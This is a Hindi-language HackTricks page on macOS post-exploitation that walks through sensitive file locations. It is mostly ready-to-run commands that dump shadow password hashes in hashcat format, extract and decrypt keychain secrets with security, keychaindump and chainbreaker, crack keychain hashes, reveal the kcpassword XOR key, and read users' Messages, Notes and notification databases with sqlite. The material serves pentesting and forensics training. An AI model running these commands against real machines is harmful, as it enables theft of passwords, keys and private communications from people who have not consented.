# macOS संवेदनशील स्थान

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

## पासवर्ड

### शैडो पासवर्ड

शैडो पासवर्ड **`/var/db/dslocal/nodes/Default/users/`** में स्थित plists में उपयोगकर्ता के कॉन्फ़िगरेशन के साथ संग्रहीत होता है।\
निम्नलिखित oneliner का उपयोग **सभी उपयोगकर्ताओं के बारे में जानकारी** (हैश जानकारी सहित) डंप करने के लिए किया जा सकता है:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
```bash
dscl . list /Users | grep -v '^_' | while read user; do echo -n "$user:"; dscl . -read /Users/$user dsAttrTypeNative:ShadowHashData | tr -d ' ' | cut -d '[' -f2 | cut -d ']' -f1 | xxd -r -p | base64; echo; done
```
{% endcode %}

[**इस तरह की स्क्रिप्ट्स**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) या [**यह वाली**](https://github.com/octomagon/davegrohl.git) का उपयोग करके हैश को **hashcat** **प्रारूप** में परिवर्तित किया जा सकता है।

सभी गैर-सेवा खातों के क्रेडेंशियल्स को hashcat प्रारूप `-m 7100` (macOS PBKDF2-SHA512) में डंप करने के लिए एक वैकल्पिक वन-लाइनर:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Keychain Dump

ध्यान दें कि security बाइनरी का उपयोग करते समय **पासवर्ड्स को डिक्रिप्टेड करके डंप करने** के लिए, कई प्रॉम्प्ट्स उपयोगकर्ता से इस ऑपरेशन की अनुमति मांगेंगे।
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
इस टिप्पणी के आधार पर [juuso/keychaindump#10 (टिप्पणी)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) ऐसा लगता है कि ये उपकरण Big Sur में अब काम नहीं कर रहे हैं।
{% endhint %}

हमलावर को अभी भी सिस्टम तक पहुँचने की जरूरत है और **keychaindump** चलाने के लिए **root** विशेषाधिकारों तक बढ़ाना होगा। इस दृष्टिकोण में अपनी शर्तें हैं। जैसा कि पहले उल्लेख किया गया है, **लॉगिन पर आपका कीचेन डिफ़ॉल्ट रूप से अनलॉक हो जाता है** और जब आप अपने सिस्टम का उपयोग करते हैं तो अनलॉक रहता है। यह सुविधा के लिए है ताकि उपयोगकर्ता को हर बार जब एक एप्लिकेशन कीचेन तक पहुँचना चाहता है तो उसे अपना पासवर्ड दर्ज नहीं करना पड़े। अगर उपयोगकर्ता ने इस सेटिंग को बदल दिया है और हर उपयोग के बाद कीचेन को लॉक करने का चुनाव किया है, तो keychaindump अब काम नहीं करेगा; यह एक अनलॉक कीचेन पर निर्भर करता है ताकि काम कर सके।

Keychaindump कैसे पासवर्ड को मेमोरी से निकालता है यह समझना महत्वपूर्ण है। इस लेन-देन में सबसे महत्वपूर्ण प्रक्रिया ”**securityd**“ **प्रक्रिया** है। Apple इस प्रक्रिया को **प्राधिकरण और क्रिप्टोग्राफिक ऑपरेशनों के लिए एक सुरक्षा संदर्भ डेमन** के रूप में संदर्भित करता है। Apple डेवलपर लाइब्रेरीज़ इसके बारे में बहुत कुछ नहीं बताती हैं; हालांकि, वे हमें बताते हैं कि securityd कीचेन तक पहुँच को संभालता है। अपने शोध में, Juuso कीचेन को डिक्रिप्ट करने के लिए जरूरी कुंजी को ”The Master Key“ के रूप में संदर्भित करता है। इस कुंजी को प्राप्त करने के लिए कई कदम उठाने की जरूरत है क्योंकि यह उपयोगकर्ता के OS X लॉगिन पासवर्ड से निकाला जाता है। अगर आप कीचेन फाइल को पढ़ना चाहते हैं तो आपके पास यह मास्टर कुंजी होनी चाहिए। इसे प्राप्त करने के लिए निम्नलिखित कदम किए जा सकते हैं। **securityd के हीप का स्कैन करें (keychaindump यह vmmap कमांड के साथ करता है)**। संभावित मास्टर कुंजियाँ MALLOC\_TINY के रूप में चिह्नित क्षेत्र में संग्रहीत होती हैं। आप इन हीप्स के स्थानों को निम्नलिखित कमांड के साथ स्वयं देख सकते हैं:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** तब वापस आए हीप्स में 0x0000000000000018 की घटनाओं की खोज करेगा। अगर अगला 8-बाइट मान वर्तमान हीप की ओर इशारा करता है, तो हमने एक संभावित मास्टर की पाई है। यहाँ से थोड़ा डिओब्फस्केशन अभी भी होना आवश्यक है जो सोर्स कोड में देखा जा सकता है, लेकिन एक विश्लेषक के रूप में सबसे महत्वपूर्ण बात यह है कि इस जानकारी को डिक्रिप्ट करने के लिए आवश्यक डेटा securityd की प्रोसेस मेमोरी में संग्रहीत होता है। यहाँ keychain dump आउटपुट का एक उदाहरण है।
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) का उपयोग निम्नलिखित प्रकार की जानकारी को OSX keychain से फोरेंसिक रूप से सही तरीके से निकालने के लिए किया जा सकता है:

* हैश्ड Keychain पासवर्ड, [hashcat](https://hashcat.net/hashcat/) या [John the Ripper](https://www.openwall.com/john/) के साथ क्रैकिंग के लिए उपयुक्त
* इंटरनेट पासवर्ड
* जेनेरिक पासवर्ड
* प्राइवेट कीज़
* पब्लिक कीज़
* X509 सर्टिफिकेट्स
* सिक्योर नोट्स
* Appleshare पासवर्ड

Keychain अनलॉक पासवर्ड, [volafox](https://github.com/n0fate/volafox) या [volatility](https://github.com/volatilityfoundation/volatility) का उपयोग करके प्राप्त मास्टर की, या SystemKey जैसी अनलॉक फाइल दी गई हो, तो Chainbreaker प्लेनटेक्स्ट पासवर्ड भी प्रदान करेगा।

इनमें से किसी भी तरीके से Keychain को अनलॉक किए बिना, Chainbreaker सभी अन्य उपलब्ध जानकारी दिखाएगा।

### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **SystemKey के साथ keychain कुंजियों (पासवर्ड के साथ) का डंप**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **कीचेन कुंजियों को डंप करना (पासवर्ड के साथ) हैश को क्रैक करना**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **मेमोरी डंप के साथ keychain कुंजियों (पासवर्ड के साथ) को डंप करें**

[इन चरणों का पालन करें](..#dumping-memory-with-osxpmem) **मेमोरी डंप** करने के लिए
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **उपयोगकर्ता के पासवर्ड का उपयोग करके keychain कुंजियों को डंप करें (पासवर्ड के साथ)**

यदि आप उपयोगकर्ता का पासवर्ड जानते हैं तो आप इसका उपयोग **उपयोगकर्ता के संबंधित keychain को डंप करने और डिक्रिप्ट करने** के लिए कर सकते हैं।
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** फ़ाइल एक ऐसी फ़ाइल है जिसमें **उपयोगकर्ता का लॉगिन पासवर्ड** होता है, लेकिन केवल तब जब सिस्टम के मालिक ने **स्वचालित लॉगिन सक्षम** किया हो। इसलिए, उपयोगकर्ता को बिना पासवर्ड मांगे स्वतः ही लॉग इन किया जाएगा (जो कि बहुत सुरक्षित नहीं है)।

पासवर्ड फ़ाइल **`/etc/kcpassword`** में की **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** के साथ xored होता है। अगर उपयोगकर्ता का पासवर्ड की से लंबा होता है, तो की का पुन: उपयोग किया जाएगा।\
इससे पासवर्ड को पुनः प्राप्त करना काफी आसान हो जाता है, उदाहरण के लिए [**इस स्क्रिप्ट**](https://gist.github.com/opshope/32f65875d45215c3677d) का उपयोग करके।

## डेटाबेस में रोचक जानकारी

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### सूचनाएं

आप सूचनाओं का डेटा `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` में पा सकते हैं।

अधिकांश रोचक जानकारी **blob** में होगी। इसलिए आपको उस सामग्री को **निकालना** होगा और उसे **मानव** **पठनीय** रूप में **परिवर्तित** करना होगा या **`strings`** का उपयोग करना होगा। इसे एक्सेस करने के लिए आप कर सकते हैं:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### नोट्स

उपयोगकर्ता के **नोट्स** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में पाए जा सकते हैं।

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
